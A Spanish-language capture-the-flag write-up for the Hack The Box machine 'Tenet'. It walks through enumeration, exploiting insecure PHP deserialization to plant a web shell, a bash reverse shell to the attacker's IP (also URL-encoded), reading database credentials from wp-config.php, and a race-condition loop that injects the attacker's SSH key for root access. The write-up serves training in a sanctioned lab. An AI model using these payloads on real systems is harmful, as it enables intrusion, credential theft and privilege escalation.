---
title: Tenet - Hack The Box
description: >-
  Tenet es una máquina de nivel medio con Sistema Operativo Linux, que contiene un servidor web Apache que aloja un Wordpress. El acceso al sistema se logra mediante la explotación de una vulnerabilidad insecure deserialization. Una vez dentro, se logra obtener credenciales de una base de datos, lo que permite la migración a un usuario con mayores privilegios. Finalmente, se descubre que aprovechando una vulnerabilidad de race condition, un script bash con permisos de root, ejecutable mediante sudo, facilita la escalada de privilegios al permitir la escritura de claves SSH propias.
author: Mariano Alfonso
date: 2024-02-23
categories: [HackTheBox, Medium, CFTs]
tags: [Pentesting, Linux, WordPress, Information Disclosure, Insecure Deserialization, Race Condition, SSH Key]
image:
  path: /assets/img/HTB/writeup-tenet/Tenet.png
  alt: Máquina Tenet de la Plataforma Hack The Box.
---

[Download Write-Up](https://github.com/0mariano/0mariano.github.io/blob/master/PDFs%20and%20tex/Write-Up/MAA-Write-Up-Tenet.pdf)

---

## Introducción 📄
En el presente Write Up explicare los pasos para resolver la máquina <a href="https://app.hackthebox.com/machines/Tenet" style="color:orange"><strong>**Tenet**</strong></a> de la plataforma [HackTheBox](https://hackthebox.com).

## Scope 🎯
El scope de esta máquina fue definida como la siguiente.

<div style="width: 100%;">
  <table style="width: 100%; table-layout: fixed; border-collapse: collapse;">
    <caption style="caption-side: bottom; text-align: center; color: white;">
      <span style="font-weight: bold; color: white;">Table 1</span>: Scope.
    </caption>
    <tr>
      <th style="text-align: center; white-space: nowrap; padding: 10px; width: 50%;">Servidor Web / Direcciónes IPs / Hosts / URLs</th>
      <th style="text-align: center; padding: 10px; width: 35%;">Descripción</th>
      <th style="text-align: center; padding: 10px; width: 20%;">Subdominios</th>
    </tr>
    <tr>
      <td style="text-align: center; word-wrap: break-word; padding: 10px;">10.129.4.206</td>
      <td style="text-align: left; word-wrap: break-word; padding: 10px;">Dirección IP de la máquina Tenet</td>
      <td style="text-align: center; word-wrap: break-word; padding: 10px;">Todos</td>
    </tr>
  </table>
</div>

## Metodologia Aplicada 📦​​📚
* Enfoque de prueba: En el proceso de pruebas de seguridad, se optó por un enfoque gray-box, lo que significó que se tenía un nivel de acceso parcial a la infraestructura y el sistema objetivo.
* Las etapas aplicadas para esta auditoria fueron las siguientes:

![](/assets/img/HTB/writeup-tenet/Etapas-pentest.png) _**Figure 1**: Etapas del Pentest._

## Reconocimiento - Enumeración 🔍
### Uso de la Herramienta Nmap 👁️
Primero, realizamos un escaneo con ayuda de la herramienta Nmap en busca de puertos abiertos.

```bash
# Primer escaneo.
--------------------------------------------------------------
nmap -p- --open --min-rate 5000 10.129.4.206
```

<div style="width: 100%;">
  <table style="width: 100%; table-layout: fixed; border-collapse: collapse;">
    <caption style="caption-side: bottom; text-align: center; color: white;">
      <span style="font-weight: bold; color: white;">Table 2</span>: Definición de Parámetros de Nmap Utilizados en el Primer Escaneo.
    </caption>
    <tr>
      <th style="text-align: center; white-space: nowrap; padding: 10px; width: 20%;">Parámetro</th>
      <th style="text-align: center; padding: 10px; width: 80%;">Descripción</th>
    </tr>
    <tr>
      <td style="text-align: center; word-wrap: break-word; padding: 10px;"><b>-p-</b></td>
      <td style="text-align: center; word-wrap: break-word; padding: 10px;">Escanea los 65535 puertos.</td>
    </tr>
    <tr>
      <td style="text-align: center; word-wrap: break-word; padding: 10px;"><b>--open</b></td>
      <td style="text-align: center; word-wrap: break-word; padding: 10px;">Muestra solo los puertos abiertos.</td>
    </tr>
    <tr>
      <td style="text-align: center; word-wrap: break-word; padding: 10px;"><b>--min-rate 5000</b></td>
      <td style="text-align: center; word-wrap: break-word; padding: 10px;">Establece la velocidad mínima de envío de paquetes a 5000 paquetes por segundo.</td>
    </tr>
  </table>
</div>

Y obtenemos lo siguiente:

![](/assets/img/HTB/writeup-tenet/nmap_1.png) _**Figure 2**: Primer Escaneo._

Para el puerto <span style="color:green"> 22 </span>, este puerto está asociado al servicio **SSH** (Secure Shell), que es un protocolo de red que permite a los usuarios acceder y controlar de forma remota una máquina a través de una conexión cifrada. 

Para el puerto <span style="color:orange"> 80 </span>,  este puerto está asociado al protocolo **HTTP** (Hypertext Transfer Protocol), utilizado para la transferencia de datos. 

Se procedió a realizar otro escaneo con los scripts default de nmap, también especificando la versión.

```bash
# Segundo escaneo.
--------------------------------------------------------------
nmap -sC -sV -p22,80 10.129.4.206
```

<div style="width: 100%;">
  <table style="width: 100%; table-layout: fixed; border-collapse: collapse;">
    <caption style="caption-side: bottom; text-align: center; color: white;">
      <span style="font-weight: bold; color: white;">Table 3</span>: Definición de Parámetros de Nmap Utilizados en el Segundo Escaneo.
    </caption>
    <tr>
      <th style="text-align: center; white-space: nowrap; padding: 10px; width: 20%;">Parámetro</th>
      <th style="text-align: center; padding: 10px; width: 80%;">Descripción</th>
    </tr>
    <tr>
      <td style="text-align: center; word-wrap: break-word; padding: 10px;"><b>-sC</b></td>
      <td style="text-align: center; word-wrap: break-word; padding: 10px;">Realiza un escaneo con los scripts por defecto.</td>
    </tr>
    <tr>
      <td style="text-align: center; word-wrap: break-word; padding: 10px;"><b>-sV</b></td>
      <td style="text-align: center; word-wrap: break-word; padding: 10px;">Determina las versiones de los servicios que se ejecutan en los puertos encontrados.</td>
    </tr>
    <tr>
      <td style="text-align: center; word-wrap: break-word; padding: 10px;"><b>-p</b></td>
      <td style="text-align: center; word-wrap: break-word; padding: 10px;">Especifica los puertos que se escanearán.</td>
    </tr>
  </table>
</div>

Bueno, conocemos la versión de _**SSH**_, que es bastante antigua, y la versión de _**Apache**_.

![](/assets/img/HTB/writeup-tenet/nmap_2.png) _**Figure 3**: Segundo Escaneo._

### Puerto 80 🚪
Vamos a ver qué hay detras de ese puerto 80.

![](/assets/img/HTB/writeup-tenet/apache-template.png) _**Figure 4**: Template de Apache._

Solo hay un template de apache.

### Uso de la Herramienta Gobuster 🔎🌐
Vamos a enumerar los directorios, para eso, usaremos gobuster.

```bash
# Comandos de gobuster utilizados.
--------------------------------------------------------------
gobuster dir -u http://10.129.4.206 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
```

<div style="width: 100%;">
  <table style="width: 100%; table-layout: fixed; border-collapse: collapse;">
    <caption style="caption-side: bottom; text-align: center; color: white;">
      <span style="font-weight: bold; color: white;">Table 4</span>: Definición de Parámetros de Gobuster Utilizados para Enumerar Directorios.
    </caption>
    <tr>
      <th style="text-align: center; white-space: nowrap; padding: 10px; width: 15%;">Parámetro</th>
      <th style="text-align: center; padding: 10px; width: 120%;">Descripción</th>
    </tr>
    <tr>
      <td style="text-align: center; word-wrap: break-word; padding: 10px;"><b>dir</b></td>
      <td style="text-align: center; word-wrap: break-word; padding: 10px;">Indica a gobuster que debe realizar una búsqueda de directorios.</td>
    </tr>
    <tr>
      <td style="text-align: center; word-wrap: break-word; padding: 10px;"><b>-u</b></td>
      <td style="text-align: center; word-wrap: break-word; padding: 10px;">Especifica la UR a la que se dirigirá gobuster para realizar la enumeración de directorios.</td>
    </tr>
    <tr>
      <td style="text-align: center; word-wrap: break-word; padding: 10px;"><b>-w</b></td>
      <td style="text-align: center; word-wrap: break-word; padding: 10px;">Especifica la ruta del archivo de las palabras que se utilizará para realizar la enumeración de directorios.</td>
    </tr>
  </table>
</div>

Ok, hay un directorio en el servidor llamado **WordPress**. 

![](/assets/img/HTB/writeup-tenet/gobuster.png) _**Figure 5**: Enumeración de Directorios._

### Virtual Hosting 🏘️
Bueno, si ingresamos al directorio, vemos que se ve bastante mal. Esto se debe a que se está produciendo **Virtual Hosting**.

![](/assets/img/HTB/writeup-tenet/wordpress-directory.png) _**Figure 6**: Virtual Hosting._

Si revisamos el código fuente, vemos varios dominios. 

![](/assets/img/HTB/writeup-tenet/código-fuente-wordpress.png) _**Figure 7**: Código Fuente._

Claro, para solucionar este pequeño problema y visualizar correctamente la página web, debemos agregar el dominio **tenet.htb** al archivo **/etc/hosts**

```bash
# Agregando dominio al archivo /etc/hosts
--------------------------------------------------------------
sudo nano /etc/hosts
          
10.129.4.206 tenet.htb
```
{: file='/etc/hosts'}

Esto hará que la IP apunte al dominio. ahora, cuando ingresemos al dominio, no tendremos problemas.  

Una vez dentro, enumeramos las tecnologías con **Wappalyzer** gy verificamos si efectivamente hay un **CMS** (Content Management System - Sistema de Gestión de Contenidos) de WordPress. Observamos **PHP**, que obviamente corresponde a WordPress, una database **MySQL** y el tema que está empleando WordPress. 

![](/assets/img/HTB/writeup-tenet/wappalyzer.png) _**Figure 8**: Enumeración de Tecnologias con Wappalyzer._

## Análisis de Vulnerabilidades ​🔬​
### Information Disclosure 🗣️
Revisando la página web, vemos tres publicaciones y una de ellas tiene el título **Migration**. Si entramos en ese post, nos informan sobre una migración de datos y nos piden paciencia, ya que un desarrollador está a cargo de ello. Sin embargo, si miramos más abajo, encontramos un comentario de un usuario llamado **neil**, quien pregunta si eliminaron el archivo **sator.php** y su correspondiente **backup**. 

![](/assets/img/HTB/writeup-tenet/migration.png) _**Figure 9**: Information Disclusure._

Bueno, bueno, bueno, esto me hace suponer que el developer neil ha cometido un error, ya que ha divulgado información que supuestamente nadie debería saber. 

Luego de un tiempo (me volví loco buscando el archivo sator.php en la ruta http://tenet.htb/sator.php), me olvidé de que la máquina aplica virtual hosting. Entonces, lo que hice fue agregar el subdominio sator.tenet.htb al archivo /etc/hosts 

```bash
# Agregando subdominio al archivo /etc/hosts
--------------------------------------------------------------
sudo nano /etc/hosts
          
10.129.4.206 tenet.htb sator.tenet.htb
```
{: file='/etc/hosts'}

Ahora podemos acceder al archivo sator.php sin problemas. 

![](/assets/img/HTB/writeup-tenet/sator-tenet-htb.png) _**Figure 10**: Archivo sator.php_

Después me di cuenta de que también podemos ingresar desde la IP, sin agregar el subdominio al archivo /etc/hosts 

![](/assets/img/HTB/writeup-tenet/ip-sator-tenet-htb.png) _**Figure 11**: Ingresando al archivo sator.php desde la IP._

### Uso de la Herramienta Wfuzz 📂🔍
Usaré wfuzz para saber cuál es la extensión del archivo de backup. Para ello, utilizaré el siguiente comando.  

```bash
# Comandos utilizados para realizar fuzzing con wfuzz
--------------------------------------------------------------
wfuzz -c --hc=404 -z file,extension.txt http://sator.tenet.htb/sator.php.FUZZ
```

<div style="width: 100%;">
  <table style="width: 100%; table-layout: fixed; border-collapse: collapse;">
    <caption style="caption-side: bottom; text-align: center; color: white;">
      <span style="font-weight: bold; color: white;">Table 5</span>: Definición de Parámetros de Wfuzz Utilizados para Enumerar Directorios.
    </caption>
    <tr>
      <th style="text-align: center; white-space: nowrap; padding: 10px; width: 20%;">Parámetro</th>
      <th style="text-align: center; padding: 10px; width: 80%;">Descripción</th>
    </tr>
    <tr>
      <td style="text-align: center; word-wrap: break-word; padding: 10px;"><b>-c</b></td>
      <td style="text-align: center; word-wrap: break-word; padding: 10px;">Habilita la coloración en la salida de wfuzz, lo que facilita la identificación <br> visual de diferentes tipos de respuestas.</td>
    </tr>
    <tr>
      <td style="text-align: center; word-wrap: break-word; padding: 10px;"><b>--hc=404</b></td>
      <td style="text-align: center; word-wrap: break-word; padding: 10px;">La opción --hc significa "hide code" y oculta las respuestas que tienen el código de estado 404.</td>
    </tr>
    <tr>
      <td style="text-align: center; word-wrap: break-word; padding: 10px;"><b>-z file</b></td>
      <td style="text-align: center; word-wrap: break-word; padding: 10px;">Este parámetro indica que wfuzz debe utilizar una <br> lista de palabras contenida en un archivo de texto.</td>
    </tr>
  </table>
</div>

Como resultado, el archivo de respaldo tiene la extensión **.bak**

![](/assets/img/HTB/writeup-tenet/wfuzz.png) _**Figure 12**: Fuzzing con wfuzz._

Si ingresamos a la ruta, vemos que se nos descarga un archivo que contiene el siguiente código PHP. 

```php
# Código php
--------------------------------------------------------------
<?php

class DatabaseExport
{
        public $user_file = 'users.txt';
        public $data = '';

        public function update_db()
        {
                echo '[+] Grabbing users from text file <br>';
                $this-> data = 'Success';
        }


        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this >data);
                echo '[] Database updated <br>';
        //      echo 'Gotta get this working properly...';
        }
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();

?>
```
{: file='sator.php.bak'}

### Insecure Deserialization 🔄🔓
Aquí vemos cosas interesantes, pero primero debemos tener en claro dos conceptos fundamentales: 

1. <span style="color:red"> Serialización </span>: En este proceso, los objetos son convertidos en una secuencia de bytes, lo que los hace adecuados para ser almacenados en un archivo o transmitidos a través de una red. La serialización preserva la estructura y el estado del objeto original. 

> Por ejemplo, si tienes un objeto en un lenguaje de programación como Python, puedes serializarlo para convertirlo en una cadena de bytes que pueda ser guardada en un archivo o transmitida a otro sistema. 

2. <span style="color:blue"> Deserialización </span>: Es el proceso inverso. Convierte la secuencia de bytes de vuelta en un objeto en memoria que puede ser utilizado por el programa. Esto es útil cuando necesitas recuperar datos previamente serializados, como al leer un archivo que contiene datos serializados o recibir datos a través de una red. 

Sé que la explicación puede resultar confusa, pero de igual manera dejaré documentación al final del Write-Up. 

Bien, ustedes podrían preguntar: ¿Pero Marian, qué tiene que ver esto con la máquina? Bueno, al observar el código, vemos que la función **unserialize** se encarga de deserializar los datos del usuario que le pasamos como al parámetro **arepo**, los cuales son guardados en la variable **input**. Esto es muy peligroso, ya que nunca debemos confiar en la entrada del usuario. Casi todas las vulnerabilidades que no han sido remediadas se deben a la falta de sanitización en la entrada del usuario. Por lo tanto, si un usuario ingresa datos serializados, estos serán deserializados mediante la función unserialize sin ningún tipo de sanitización. 

En consecuencia, este código es vulnerable a **insecure deserialization**.

## Explotación 💣​
### Remote Code Execution (RCE) via Insecure Deserialization ​👨‍💻​🔄🔓
Entonces se me ocurrió crear un script para explotar esta vulnerabilidad, mediante variables públicas, creamos un archivo php que contenga datos serializados. Esta data sería una llamada al sistema con el parámetro **cmd**, lo que me permitiría ejecutar cualquier comando, por eso no utilizo el 

```php
# No utilizo este comando porque, con este estaría ejecutando solamente whoami, en vez de pasarle yo el comando que quiera las veces que quiera.
--------------------------------------------------------------
'<?php system(whoami); ?>'
```
Por ende aqui esta el comando que utilizare:

```php
# Script en php
--------------------------------------------------------------
<?php

class DatabaseExport {

    public $user_file = "rce.php";
    public $data = '<?php system($_REQUEST["cmd"]); ?>';

}

$script = new DatabaseExport;
echo serialize($script);

?>
```

Una vez creado el archivo y ejecutado, nos genera el siguiente objeto serializado: 

![](/assets/img/HTB/writeup-tenet/object_serializado.png) _**Figure 13**: Objeto Serializado._

Antes de ingresarlo en la URL, debemos codificarlo. Para eso, vamos a usar CyberChef.

![](/assets/img/HTB/writeup-tenet/cyberchef.png) _**Figure 14**: Objeto Serializado en Formato URL Encode._

Una vez enviado el objeto serializado, nos devuelve un mensajeque indica que la base de datos se ha actualizado.

![](/assets/img/HTB/writeup-tenet/database-update.png) _**Figure 15**: Mensaje Database Update._

Procedemos a probar cualquier comando para ver si tenemos RCE. Para ello, apuntamos al archivo que creamos y al parámetro cmd. 

![](/assets/img/HTB/writeup-tenet/rce.png) _**Figure 16**: Comandos para Confirmar RCE._

Y si tenemos el RCE, pero un consejito par aque se vea mejor, en estos caso precionamos **CTRL+U** y apreciaremos la salida mucho mejor.

![](/assets/img/HTB/writeup-tenet/ctrl+u.png) _**Figure 17**: CTRL + U para Visualizar Mejor la Salida._

### Revshell 💻🔌
Bueno, vemos que somos el usuario www-data, pero para examinar mejor el contenido, nos enviaremos una revshell. Si ya tenemos RCE, ¿por qué no hacerlo? Para ello, abriremos **BurpSuite** y interceptaremos la petición para agregar el siguiente comando y establecer una reverse shell. 

> bash -c "bash -i >& /dev/tcp/10.10.14.92/6162 0>&1"

Pero este comando debe ser codificado en URL. Aquí está:

> %62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%39%32%2f%36%31%36%32%20%30%3e%26%31%22

Enviamos la petición y obtenemos la revshell.

![](/assets/img/HTB/writeup-tenet/rvshell.png) _**Figure 18**: Revshell Obtenida._

Antes de seguir, voy a estabilizar la shell, esto permitira hacer **CTRL + C**, **CTRL + L** sin que quitee la revshell.

A continuación, dejo los pasos de los comandos: 

```bash
# Tratamiento de la tty
--------------------------------------------------------------
script /dev/null -c bash

CTRL + Z

stty raw -echo; fg

reset xterm

export TERM=xterm

export SHELL=bash
```

Una vez establecida la shell, si vamos a la ruta **/home/neil** y queremos visualizar la flag, no podemos porque no tenemos permisos. 

![](/assets/img/HTB/writeup-tenet/user-flag-denied.png) _**Figure 19**: Flag Sin Permisos de Lectura._

### Credenciales en Texto Claro 🔤
Bien, para eso volvamos a la ruta inicial, me refiero a esta **_/var/www/html/wordpress_** , donde se encuentra el archivo **wp-config.php** que suele tener credenciales de la **database** en **texto claro**.

![](/assets/img/HTB/writeup-tenet/wp-config-php.png) _**Figure 20**: Archivo wp-config.php_

Procedemos a leer el contenido y encontramos las credenciales del usuario **neil** y su **password**.

![](/assets/img/HTB/writeup-tenet/cat-wp-config-php.png) _**Figure 21**: Credenciales del Usuario neil._

Procedemos a cambiar de usuario para verificar si las credenciales funcionan. 

![](/assets/img/HTB/writeup-tenet/su-neil.png) _**Figure 22**: Cambio de Usuario._

Como funcionó y ahora que recuerdo que el ssh está abierto, así que mejor me conecto por ahí. Funcionó correctamente y ya tenemos acceso a la primera flag. 

![](/assets/img/HTB/writeup-tenet/flag-user-censured.png) _**Figure 23**: Conexión por SSH y Flag del user._

### Escalada de Privilegios 📈​
Bueno, ya que tenemos acceso a la máquina, solo quedaría explotar una última vulnerabilidad y escalar privilegios.
Para ello, se me ocurrió ejecutar sudo -l para ver qué archivos puedo ejecutar como usuario root sin proporcionar la contraseña de dicho usuario.

![](/assets/img/HTB/writeup-tenet/sudo-l.png) _**Figure 24**: Script Ejecutable como Usuario root._

Si miramos el contenido del script vemos lo siguiente:

```bash
# Script en bash
--------------------------------------------------------------
#!/bin/bash

checkAdded() {

        sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)

        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then

                /bin/echo "Successfully added $sshName to authorized_keys file!"

        else

                /bin/echo "Error in adding $sshName to authorized_keys file!"

        fi

}

checkFile() {

        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then

                /bin/echo "Error in creating key file!"

                if [[ -f $1 ]]; then /bin/rm $1; fi

                exit 1

        fi

}

addKey() {

        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)

        (umask 110; touch $tmpName)

        /bin/echo $key >>$tmpName

        checkFile $tmpName

        /bin/cat $tmpName >>/root/.ssh/authorized_keys

        /bin/rm $tmpName

}

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
addKey
checkAdded
```
{: file='/usr/local/bin/enableSSH.sh'}

### Race Condition ⏱️🏁
Interesante, lo que básicamente sucede es que crea un archivo **ssh-XXXXXXXX** en el directorio **/tmp**, el cual contiene la **clave pública SSH del usuario root**. Luego, agrega esta clave al archivo **authorized_keys** en el directorio **/root/.ssh/** y verifica si la clave se ha agregado correctamente. Una vez **agregada** al **archivo /root/.ssh/authorized_keys**, podremos ingresar por SSH como usuario **root sin necesidad** de **proporcionar** la **password**. 

Entonces aquí es donde se produce la vulnerabilidad de la race condition. ¿Por qué? Es sencillo: si ejecutamos el script varias veces, nos mostrará que se crea un archivo diferente en cada ejecución. Cada archivo contiene la clave pública SSH del usuario root. Antes de agregarlo al directorio **/root/.ssh/authorized_keys**, se verifica que se haya agregado correctamente y luego se borra. 

![](/assets/img/HTB/writeup-tenet/ejecucion-de-mktemp.png) _**Figure 25**: Ejecución del Script._

Es por eso que, si sabemos que en la ruta **/tmp/ssh** se crea un archivo temporal que contiene la clave pública, se me ocurre tratar de detectar el archivo, eliminarlo y reemplazar la clave por **mi clave pública SSH de mi máquina atacante**. De esta manera, cuando se añada mi clave al directorio **/root/.ssh/authorized_keys**, podré conectarme como root por SSH sin necesidad de proporcionar una contraseña. Hay que ser rápidos ya que es un archivo temporal y luego se elimina. 

Bueno, para explotar la race condition, debemos generar una clave pública SSH. Lo haremos con la herramienta **ssh-keygen**. 

![](/assets/img/HTB/writeup-tenet/ssh-keygen.png) _**Figure 26**: Generación de Claves SSH._

Una vez creada la clave pública y la clave privada, crearemos un script en bash que será un bucle donde sobrescribirá el archivo con mi clave SSH. En el script utilizaremos la clave pública. por favor, no compartan la clave privada, ya que esta debe ser conocida solo por nosotros mismos. 

```bash
# Script en bash
--------------------------------------------------------------
while true; 

do for 

privsec 

in /tmp/ssh-*; do 

echo 

"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXDrW7EhWE9YZiN7Q+5FBcYjyFjOPL26HTvEhYwaY6wPtnGoJUQM1jJG6t8dKxybU3jJrcCU4KF7QMeDFL35OI9KJKezV5nkIMSVrUR5EEPaYF2vytky/NKPVfGaw+rMbC2yMAF9paZBZl5tdFM05fPPpiJRLG8oOhFKvU6083s64WIBYcpv1F1TG32td/X9JdLBLAAubDr0sLOZ6+ACCXJfbKAyh9DgnUSPOjdMStlPkTkWtLV6x1Gvzj6FyRpMN77aYVs1E+e6liSKs7EwUQ1W99z2dmgd6E8VEtbV9q55x/7ZWGpwyj/iNCNMhR7dUZJ7IkplJkITVyDIqCskWPDBre2RNgNpPpGvdRZUEqv6VWBUpnNK81/1FDXdUVB0+qstxt189gDGU2MZLDHJtotgwR9j+VE+/36H/5y2V7bhzzRL0SBF91DDgWsd79Ih0MzZ4LKqq3buwCNff//V3WeNKy9BKPtFf8FuxSJO+l6ZFz7Ph5dD8z6rtp4aaSpBM= root@kali" > $privsec ; done; done
```

Ejecutamos el bucle, luego ejecutamos el script con sudo. Después de un tiempo (tengamos en cuenta que se trata de un race condition y puede llevar algún tiempo), consigamos la conexión por SSH como usuario root. Si no consiguen acceso por ssh como usuario root a la primera, no se frustren y sigan intentándolo hasta lograr la conexión. 

Me costó un poco, pero al final conseguí la conexión por ssh como usuario root. 

![](/assets/img/HTB/writeup-tenet/root.png) _**Figure 27**: Conexión por SSH como Usuario._

Bueno solo falta ver la flag de root.

![](/assets/img/HTB/writeup-tenet/flag-root-censured.png) _**Figure 29**: Flag de root._

## Conclusión Final 💬
La máquina resultó bastante sencilla para obtener una reverse shell, pero luego tuve dificultades con la escalada de privilegios. El race condition fue un desafío y también me aburrió un poco decidir cómo realizar la escalada de privilegios. A pesar de eso, la máquina fue muy interesante, abordando varias vulnerabilidades: 

* Information Disclosure
* Remote Code Execution (RCE) - via Insecure Deserialization
* Race Condition

## Apéndice I Links de Referencia 📎​
### Herramientas Utilizadas en la Auditoria 🛠️​
* [Nmap:](https://nmap.org) [https://nmap.org](https://nmap.org) - [https://www.kali.org/tools/nmap](https://www.kali.org/tools/nmap) → Uso de nmap para el escaneo de puertos.
* [Gobuster:](https://www.kali.org/tools/gobuster) [https://www.kali.org/tools/gobuster](https://www.kali.org/tools/gobuster) → Uso de gobuster para enumerar directorios. 
* [Wappalyzer:](https://www.wappalyzer.com) [https://www.wappalyzer.com](https://www.wappalyzer.com) →  Uso de wappalyzer para enumerar tecnologias.
* [Wfuzz:](https://www.kali.org/tools/wfuzz) [https://www.kali.org/tools/wfuzz](https://www.kali.org/tools/wfuzz) → Uso de wfuzz para realizar fuzzing de extensiónes.
* [CyberChef:](https://gchq.github.io/CyberChef) [https://gchq.github.io/CyberChef](https://gchq.github.io/CyberChef) → Uso de CyberChef para encodear en URL la revshell.
* [BurpSuite Community Edition:](https://portswigger.net/burp/communitydownload ) [https://portswigger.net/burp/communitydownload](https://portswigger.net/burp/communitydownload) → Uso de BurpSuite para interceptar peticiones.

### Documentación ​📰​​
* [PortSwigger: Insecure deserialization](https://portswigger.net/web-security/deserialization) [https://portswigger.net/web-security/deserialization](https://portswigger.net/web-security/deserialization) 
* [OWASP: Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html) [https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
* [How to Use ssh-keygen to Generate a New SSH Key?:](https://www.ssh.com/academy/ssh/keygen) [https://www.ssh.com/academy/ssh/keygen](https://www.ssh.com/academy/ssh/keygen)
